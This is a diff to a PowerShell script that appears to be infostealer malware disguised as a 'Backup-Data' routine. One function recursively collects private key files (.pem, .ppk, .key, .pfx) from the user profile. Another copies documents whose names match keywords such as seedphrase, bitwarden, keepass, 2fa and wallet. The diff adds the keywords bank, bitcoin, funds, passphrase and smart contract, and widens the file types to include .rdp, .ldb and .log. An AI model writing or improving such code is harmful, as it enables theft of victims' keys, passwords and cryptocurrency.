@@ -802,7 +802,7 @@ function Backup-Data {
     function ExportPrivateKeys {
         $privatekeysfolder = "$important_files\Certificates & Private Keys"
         New-Item -ItemType Directory -Path $privatekeysfolder -Force
-        $sourceDirectory = $env:HOMEPATH
+        $sourceDirectory = "$env:userprofile"
         $destinationDirectory = "$important_files\Certificates & Private Keys"
         $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
         $foundFiles = Get-ChildItem -Path $sourceDirectory -Recurse -Include $fileExtensions -File
@@ -812,13 +812,15 @@ function Backup-Data {
     }
     ExportPrivateKeys
 	
-    Function Invoke-GrabFiles {
+  Function Invoke-GrabFiles {
         $grabber = @(
             "2fa",
             "acc",
             "atomic wallet",
             "account",
             "backup",
+	    "bank",
+            "bitcoin",
             "backupcode",
             "bitwarden",
             "bitcoin",
@@ -833,6 +835,7 @@ function Backup-Data {
             "exodus",
             "facebook",
             "fb",
+	    "funds",
             "keepass",
             "keepassxc",
             "keys",
@@ -850,10 +853,12 @@ function Backup-Data {
             "recovery",
             "remote",
             "secret",
+	    "passphrase",
             "seedphrase",
             "wallet seed",
             "server",
             "syncthing",
+            "smart contract",
             "trading",
             "token",
             "wal",
@@ -862,7 +867,7 @@ function Backup-Data {
         $dest = $important_files
         $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
         [regex] $grab_regex = "(" + (($grabber | ForEach-Object { [regex]::escape($_) }) -join "|") + ")"
-    (Get-ChildItem -path $paths -Include "*.pdf", "*.txt", "*.doc", "*.csv", "*.rtf", "*.docx" -r | Where-Object Length -lt 1mb) -match $grab_regex | Copy-Item -Destination $dest -Force
+    (Get-ChildItem -path $paths -Include @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")  -r | Where-Object Length -lt 1mb) -match $grab_regex | Copy-Item -Destination $dest -Force
     }
     Invoke-GrabFiles
 	
